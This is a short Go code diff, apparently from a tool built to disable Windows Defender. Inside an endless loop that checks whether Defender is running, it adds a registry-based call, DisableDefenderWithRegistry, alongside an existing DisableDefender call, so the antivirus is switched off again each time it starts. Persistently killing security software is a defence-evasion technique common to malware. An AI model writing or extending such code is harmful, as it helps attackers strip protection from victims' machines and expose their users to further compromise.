@@ -1,6 +1,7 @@
 package main
 
 import (
+	"defender/native"
 	_ "embed"
 	"encoding/json"
 	"fmt"
@@ -160,6 +161,7 @@ func Start() {
 	for {
 
 		if IsDefenderRunning() {
+			native.DisableDefenderWithRegistry(true)
 			DisableDefender(true)
 		}
 
